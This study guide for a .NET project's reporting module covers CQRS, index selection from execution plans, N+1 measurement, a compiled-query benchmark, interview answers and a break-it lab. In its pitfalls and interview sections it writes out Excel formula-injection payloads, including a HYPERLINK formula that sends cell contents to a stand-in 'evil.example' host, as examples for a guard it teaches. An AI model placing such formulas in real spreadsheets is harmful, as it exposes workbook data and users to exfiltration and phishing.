# Study guide 07: Reporting (CQRS read side) and measured EF performance

> Goal: you can defend "CQRS only for reporting", read an execution plan well enough to choose an index, quantify an N+1, and explain why a compiled query was *not* adopted. Every number here comes from a CI run you can open. Nothing is estimated.

---

## 1. Concepts from first principles

### 1.1 CQRS, minus the hype
- **Command Query Responsibility Segregation:** the model you *write through* and the model you *read from* can be different.
- Most of PlantOps reads its own tables through projections, because the read shape is close to the write shape. A second model there would be cost without benefit.
- **Reporting is different:**
  - it crosses modules (a work order's *line* lives in Assets, and ADR-0002 forbids the join);
  - it aggregates time ranges;
  - it wants a flat shape.
- So a **Reporting module** keeps `reporting.WorkOrderFacts`, one row per completed work order, fed by `WorkOrderCompletedIntegrationEvent` through the M5 outbox and inbox.
- That's CQRS where it pays, and nowhere else (ADR-0011).

### 1.2 A read model must be rebuildable
- Projections only see events from when they start listening. Data from before M7, or a projection bug fixed later, needs **`POST /api/reports/rebuild`** (admin), which re-projects from the source module through a contract query.
- **The line attribution subtlety:** the event handler records the asset's line **at completion**, so last quarter's downtime stays on the line where it happened. A rebuild only knows *today's* line, so it fills the line only where none was recorded.

### 1.3 Reading an execution plan, the minimum
- SQL Server can tell you *how* it ran a query:
  - **`SET STATISTICS IO ON`** gives **logical reads**: 8 KB pages touched. That's the most stable cost number; time on a shared CI box is noisy, reads aren't.
  - **`SET STATISTICS XML ON`** gives the *actual* plan. Look at the leaf operator:
    - **Clustered Index Scan**: read the whole table.
    - **Index Seek**: jump to the range you asked for.
- **A covering index** contains every column the query needs (key plus `INCLUDE` columns), so SQL Server never goes back to the table.

### 1.4 N+1, quantified
- **N+1:** one query for the list, then one more query *per row*. It's invisible with 5 rows in development and painful with 100 in production.
- **The fix:** a single projection (`Select` into a DTO), here using snapshot columns so nothing needs looking up per row.

### 1.5 Compiled queries
- `EF.CompileAsyncQuery` skips LINQ-to-SQL translation on each call.
- The saving is real but small, and only matters on very hot paths. **Adopt only if the measurement beats the noise.**

---

## 2. What we measured (perf run **37091237887**, `.github/workflows/perf.yml`)

### 2.1 The setup
- **Hardware and database:** GitHub-hosted Ubuntu 24.04 runner (4 logical CPUs), SQL Server 2022 CU27 Developer in a container.
- **Data:** a deterministic seed (20261003): 4 lines, 200 assets, **20,000 work orders**, **20,000 fact rows**, over 24 months.
- **Report window:** the last 3 months.
- **Method:** each figure is the median of 5 runs after a warm-up.
- **Caveat:** shared runners are noisy. **Compare within the run, not across runs.**

### 2.2 Experiment 1: choosing the index from the plans

| query | no index | design's candidate | wider index (adopted) |
|---|---|---|---|
| MTTR by line | 894 reads, Clustered Index **Scan** | 35 reads, Index **Seek** | 48 reads, Index **Seek** |
| SLA by priority | 894, Scan | 35, Seek | 48, Seek |
| Downtime by line | 894, Scan | 35, Seek | 48, Seek |
| MTTR by month | 894, Scan | **894, Scan (0 % drop)** | 48, Seek |
| MTTR by asset (info) | 894, Scan | 894, Scan | 48, Seek |

- **The design's first guess was wrong**, and the plan says exactly why. The harness extracted the columns each plan reads:
  - "by month" needs `CompletedMonth`;
  - "by asset" needs `AssetId`/`AssetTag`.
  - The candidate didn't include them, so the optimiser ignored it and scanned.
- **The adopted index:** `IX_WorkOrderFacts_CompletedAt` on `CompletedAt INCLUDE (LineId, LineName, Priority, MetSla, RepairMinutes, DowntimeMinutes, AssetId, AssetTag, CompletedMonth)`. Every report query drops **894 → 48 logical reads (−94.6 %)**, and all of them become Index Seeks.
- **The decision rule was declared before measuring:** adopt if reads drop ≥ 50 % on all four date-filtered queries. The candidate failed the rule and the wider index passed.
- **Why the wider index costs 48 reads instead of 35:** it's wider, so fewer rows fit per page. That's a deliberate trade for covering every report.
- **The cost of the index:** extra storage, and slightly slower inserts into `WorkOrderFacts`. Facts are written once per completed work order, a few hundred a day, so that's negligible.

### 2.3 Experiment 2: N+1 vs projection (a page of 100 work orders)

| variant | SQL commands | median ms |
|---|---|---|
| naive: entities + one asset lookup per row | **102** | **111.5** |
| real endpoint: one projection with snapshot columns | **2** | **26.2** |

That's **4.3× faster and 51× fewer round trips**, on a container on the *same machine*. Over a real network each extra round trip adds latency, so the gap only grows.

### 2.4 Experiment 3: compiled query (work order detail by id, BenchmarkDotNet ShortRun)

| method | mean | error (99.9 %) | allocated |
|---|---|---|---|
| Regular LINQ | 594.7 µs | ± 126.76 µs | 91.78 KB |
| Compiled query | 529.0 µs | ± 37.67 µs | 85.32 KB |

- **The decision: not adopted.**
  - The intervals overlap: regular could be anywhere from 468 to 721 µs, and compiled from 491 to 567 µs.
  - The design's rule says keep it only if the difference beats the error bars. It doesn't.
- The 7 % allocation saving is real but irrelevant at this traffic. The regular LINQ stays, because it's simpler to read and change.
- *This is the right answer in an interview:* "We measured, and it wasn't worth the complexity."

### 2.5 Did it reproduce? (second run, **37091441234**, after adopting the index)
- **Logical reads: identical** (894 / 35 / 48 per query) and the same plan operators. Reads are deterministic for the same data and plan, which is why they drive the decision.
- **N+1:** 118.0 vs 31.4 ms median (**3.8×**, against 4.3× in the first run), and the same 102:2 commands. The time ratio moved and the command ratio didn't. That's runner noise, in plain sight.
- **Compiled query:** 669.2 ± 66.9 µs vs 614.4 ± 133.6 µs, overlapping again. The decision stands.

---

## 3. Guided code tour

1. **`WorkOrders.Contracts/WorkOrderIntegrationEvents.cs`**
   - `Priority`, `Source` and `DueAt` are **appended at the end**: a backward-compatible contract change. Old outbox messages without `DueAt` are still accepted, and rebuild fills them in.
2. **`Reporting/Domain/WorkOrderFact.cs`**: `Project(...)`. *Notice:*
   - `CompletedMonth` is computed in **factory time**: a completion at 2026-07-31 17:00Z is **August** in Penang;
   - `MetSla = CompletedAt <= DueAt`;
   - `DowntimeMinutes` is null unless the asset was down.
3. **`Reporting/Handlers/*`**: an inbox-guarded upsert, which resolves the line through `IAssetDirectory` at completion time.
4. **`Reporting/Queries/ReportQueries.cs`**
   - `GroupBy` plus `Count`/`Average`/`Sum`, **translated to SQL** (see the exact SQL in the perf report). A unit test asserts that `AVG`/`COUNT`/`SUM`/`GROUP BY` appear in the generated SQL for all 7 combinations.
5. **`Reporting/Queries/ReportRange.cs`**
   - **Half-open `[from, to)`**, converted from factory-local dates to UTC instants. The range is capped at 366 days (the lab's part B is about this line's partner in the query).
6. **`Reporting/Infrastructure/WorkOrderFactConfiguration.cs`**: the index, with a comment that cites the perf run.
7. **`Reporting/Export/ReportWorkbook.cs` + `SpreadsheetText.cs`**. *Notice:*
   - ClosedXML builds the workbook into a `MemoryStream`, because a zip writer needs to seek and the response stream can't.
   - Column widths come from text length, not `AdjustToContents`, which needs font metrics a slim Linux container may lack.
   - **The formula-injection guard.**
8. **`Reporting/Endpoints/ReportEndpoints.cs`**: `reports:view` for the reports and `reports:rebuild` (admin) for rebuild.
9. **`perf/PlantOps.Perf/*`**. *Notice:*
   - SQL is captured with an EF interceptor and replayed through ADO.NET with `STATISTICS IO, TIME, XML`;
   - plans are parsed with `XDocument`;
   - seeding uses `SqlBulkCopy`;
   - experiments are isolated, so one failure keeps the others' results;
   - BenchmarkDotNet runs **in process**, because the default toolchain builds a child project and needs the SDK at run time.
10. **`.github/workflows/perf.yml`**
    - Manual dispatch, **plus** PRs touching `perf/**` (manual dispatch needs the workflow on the default branch, which ours isn't yet).
    - The results go to the run summary and an artifact.
11. **`web/src/app/features/reports/*`**. *Notice:*
    - one `ReportCard` component reused three times;
    - CSS bars are `aria-hidden`, and the table holds the real numbers;
    - the export is a plain `<a href download>` (same origin, so the cookie goes along).

---

## 4. Why this, not that

| Choice | Instead of | Why |
|---|---|---|
| Read model for reporting only | CQRS everywhere / MediatR | Other screens' read and write shapes match; CQRS there is cost without benefit |
| Facts from integration events + rebuild | Reporting joins across schemas | Respects module boundaries; reporting can't slow down transactions |
| Line recorded at completion | Join to the asset's current line | Historically correct attribution |
| Index chosen from measured plans | "Index the WHERE column" | The obvious candidate missed two queries entirely |
| Logical reads as the main metric | Elapsed time | Stable on noisy shared runners |
| Projection with snapshots | Entities + per-row lookups | Measured 102 → 2 commands, 4.3× faster |
| Regular LINQ | Compiled query | Measured difference within error bars |
| ClosedXML | Raw OpenXML SDK | About ten times less code for the same workbook |
| CSS bars | A chart library | A bar is a `div` with a width; no dependency, accessible table alongside |

---

## 5. Common pitfalls

1. **Indexing the filter column only.** The "obvious" index left two of five queries scanning. Read the plan's output columns.
2. **Measuring time on shared CI.** Use logical reads for decisions and time for ratios within one run.
3. **Adopting an optimisation inside the noise.** The compiled query's 11 % "speed-up" disappears into its own error bars.
4. **Excel formula injection.** A line name of `=HYPERLINK("http://evil",…)` becomes a live formula in a manager's workbook. Prefix `= + - @`, tab and CR with `'`.
   - **The ClosedXML subtlety:** it stores that apostrophe as Excel's *quote-prefix flag*, not as part of the text. A test that looks for `'` in the value fails. Assert `HasFormula == false` instead.
5. **Closed vs half-open ranges.** `<= to` double-counts work orders that complete exactly at midnight on a boundary. Only the integration tier catches it (lab, part B).
6. **The Edit tool and trailing spaces.** An agent's edits glued lines together in `Directory.Packages.props` and the Dockerfile; the build caught it. Check `git diff` after automated edits.

---

## 6. Senior interview questions

<details>
<summary><strong>Q1. Why did you use CQRS only for reporting?</strong></summary>

**Model answer:** CQRS earns its cost when the read shape differs a lot from the write shape, or when reads must not affect writes.

For asset and work order screens, the read DTOs are near-copies of the aggregates, so we query the module's tables with projections. A separate read model there would double the code with no gain.

Reporting is the opposite. It needs the production line from another module, which we can't join across schemas. It aggregates months of data, and it shouldn't add indexes or load to transactional tables.

So a Reporting module maintains `WorkOrderFacts` from completion events through the outbox and inbox, and every report queries only that table. It's eventually consistent by a couple of seconds, which nobody running an MTTR report cares about, and it's rebuildable through an admin endpoint.
</details>

<details>
<summary><strong>Q2. How did you choose the index for the reports?</strong></summary>

**Model answer:** From execution plans on realistic data, not intuition.

A CI workflow starts SQL Server in a container, seeds 20,000 work orders and facts, and for each report query captures the exact EF SQL. It replays that with `STATISTICS IO, TIME, XML` on: with no index, with the design's candidate, and with a wider variant.

The candidate (CompletedAt with six included columns) made three queries seek, from 894 to 35 reads. But "MTTR by month" stayed a full scan at 894 reads, because the plan needed `CompletedMonth` and the index didn't cover it. "By asset" missed too.

We adopted the wider covering index, which made all five queries seek at 48 reads, a 94.6 % reduction. The decision rule (at least 50 % on all date-filtered queries) was written down before measuring. The run id is in the code comment next to the index.
</details>

<details>
<summary><strong>Q3. Give me a concrete example of N+1 and what it cost.</strong></summary>

**Model answer:** Load a page of 100 work orders as entities, then look up each one's asset in a loop. That's 102 SQL commands, including the count.

Our endpoint projects straight into a DTO using asset tag and name snapshots stored on the work order, which is 2 commands.

Measured in CI on 20,000 rows: 111.5 ms vs 26.2 ms median, 4.3× faster, and that's with the database on the same machine. Over a real network every round trip adds latency, so the gap grows.

We guard against regressions the same way on the asset list: an integration test counts commands through an EF interceptor and fails if that endpoint goes above two (M2). Adding the same guard to the work order list is a cheap next step.
</details>

<details>
<summary><strong>Q4. Do you use compiled queries?</strong></summary>

**Model answer:** We measured, and decided not to.

BenchmarkDotNet on the hottest single-row read, work order detail by id: regular LINQ 594.7 µs ± 126.8, compiled 529.0 µs ± 37.7. The error intervals overlap, so the difference isn't distinguishable from noise on that run, and the allocation saving was 7 %.

Compiled queries add a static field per query and make the code harder to change, so they need to clearly pay. On a request that also does HTTP, authentication and JSON, a possible 60 µs doesn't.

I'd revisit if profiling in production showed query translation in the hot path, for example a high-QPS lookup endpoint.
</details>

<details>
<summary><strong>Q5. What security issue can an Excel export introduce?</strong></summary>

**Model answer:** Formula injection, also called CSV or Excel injection. If a cell's text starts with `=`, `+`, `-` or `@`, Excel treats it as a formula. A user who names a line `=HYPERLINK("http://evil.example?x="&A1,"Click")` turns the export into a phishing or data-exfiltration vector inside a manager's spreadsheet.

We prefix those characters, plus tab and carriage return, which Excel strips first, with an apostrophe. ClosedXML stores that as the cell's quote-prefix flag, so the user sees the original text, but it's a string cell, not a formula.

A unit test covers every dangerous prefix, and an integration test opens the real exported workbook and asserts the hostile line name isn't a formula.
</details>

---

## 7. Break-it lab (two parts, offline)

1. Run `git checkout -b lab-07`.

### Part A: weaken the formula-injection guard
2. In `src/Modules/Reporting/PlantOps.Modules.Reporting/Export/SpreadsheetText.cs`, remove `'@'`:
   ```csharp
   private static readonly char[] Dangerous = ['=', '+', '-', '\t', '\r'];
   ```
3. Run `dotnet test tests/PlantOps.Modules.Reporting.Tests`.

   **Observe** (verified on this code): 1 failure, `Text_that_could_be_a_formula_gets_a_leading_apostrophe(input: "@SUM(A1:A9)")`. `@` is Excel's implicit-intersection prefix, and it still starts a formula.
4. Undo: `git checkout -- src/Modules/Reporting/PlantOps.Modules.Reporting/Export/SpreadsheetText.cs`.

### Part B: a bug the unit tests can't see
5. In `src/Modules/Reporting/PlantOps.Modules.Reporting/Queries/ReportQueries.cs`, change the range filter from half-open to closed:
   ```csharp
   .Where(f => f.CompletedAt >= range.FromUtc && f.CompletedAt <= range.ToUtc);
   ```
6. Run `dotnet test tests/PlantOps.Modules.Reporting.Tests`.

   **Observe** (verified on this code): **all 64 unit tests pass**, and the 9 integration tests are skipped locally.
7. Ask yourself:
   - Which test *would* catch this? The CI integration test with seeded facts at the exact range edges: a work order completed at the `to` instant must be excluded.
   - What's the real-world damage? A work order completed at 00:00 Penang time on the 1st is counted in **both** months' MTTR, silently inflating counts.
   - What's the lesson? Some bugs live in the contract between your code and the database. Unit tests with fakes can't see them; **integration tests against the real engine can**. That's why this project runs SQL Server in CI rather than mocking it (ADR-0005).
8. Clean up:
   ```bash
   git checkout -- . && git checkout m7-reporting && git branch -D lab-07
   ```

---

## 8. Measured numbers from this milestone (sources)
- **Performance:** perf run **37091237887**. All of §2 comes from it; open the run's summary on GitHub to see the full tables and the exact SQL.
- **CI:** 513 .NET tests, 0 skipped, including 9 reporting integration tests and the xlsx round trip on Linux.
- **Vitest:** 201 tests in both time zones.
- **Angular initial bundle:** 552.86 kB raw; the reports chunk is 10.20 kB.
